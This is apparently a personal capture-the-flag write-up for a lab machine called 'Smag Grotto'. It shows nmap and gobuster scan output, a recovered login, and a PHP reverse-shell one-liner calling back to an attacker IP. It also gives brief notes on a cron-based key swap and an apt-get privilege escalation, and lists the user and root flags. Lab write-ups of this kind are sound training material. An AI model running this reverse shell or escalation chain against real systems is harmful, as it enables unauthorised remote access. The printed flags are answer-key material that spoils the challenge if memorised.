Smag_Grotto.doc
---------------------------

name : Eviyatar Cohen

Date : 3.10.2022

IP = 10.10.103.2
-----------------------------------------

Nmap Results:
================
nmap -sC -sV 10.10.103.2                       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 03:45 EDT
Nmap scan report for 10.10.103.2
Host is up (0.088s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.76 seconds

----------------------------------------------------------------

GoBuster Results:
==================
gobuster dir -u http://10.10.103.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.103.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/03 03:47:18 Starting gobuster in directory enumeration mode
===============================================================
/mail                 (Status: 301) [Size: 309] [--> http://10.10.103.2/mail/]
/server-status        (Status: 403) [Size: 276]                               
Progress: 94134 / 207644 (45.33%)                                            ^C
[!] Keyboard interrupt detected, terminating.
                                                                              
===============================================================
2022/10/03 04:02:02 Finished
===============================================================


Credentials Found:
======================
helpdesk:cH4nG3M3_n0w

PHP rev-shell syntax :
==========================
php -r '$sock=fsockopen("10.18.26.95",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

After i got a shell i used my own id_rsa/pub key to rewrite the file in the cron tab to access jake user

after it i used atp-get GTFOBin to get root shell!!

Flags!!
==========

User Flag : iusGorV7EbmxM5AuIe2w499msaSuqU3j

Root Flag : uJr6zRgetaniyHVRqqL58uRasybBKz2T

